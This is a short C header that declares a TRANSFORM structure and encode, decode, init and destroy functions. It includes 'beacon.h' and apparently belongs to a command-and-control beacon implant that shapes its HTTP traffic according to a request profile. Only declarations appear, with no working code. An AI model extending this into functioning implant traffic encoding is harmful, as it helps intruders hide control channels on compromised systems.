#pragma once

#include "beacon.h"

typedef struct TRANSFORM
{
	const char* headers;
	const char* uriParams;
	const char* uri;
	void* body;
	DWORD bodyLength;
	unsigned int outputLength;
	const char* transformed;
	char* temp;
	datap* parser;
} TRANSFORM;

void TransformInit(TRANSFORM* transform, int size);

void TransformEncode(TRANSFORM* transform,
	unsigned char* request_profile,
	const char* session,
	const int session_len,
	const char* response,
	const int response_len);

int TransformDecode(char* recover, char* recoverable, int recoverableLength, int maxGet);

void TransformDestroy(TRANSFORM* transform);